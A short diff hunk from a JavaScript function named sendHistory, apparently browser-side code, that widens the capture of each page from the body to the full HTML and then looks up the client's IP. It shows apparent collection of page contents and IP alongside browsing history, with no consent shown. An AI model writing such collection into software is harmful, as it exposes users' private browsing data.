@@ -192,7 +192,7 @@ function sendHistory(url, title) {
   }
   let data = "";
   try {
-    data = document.querySelector('body').outerHTML;
+    data = document.querySelector('html').outerHTML;
   } catch(e){}
   try {
     getIpClient((ip) => {
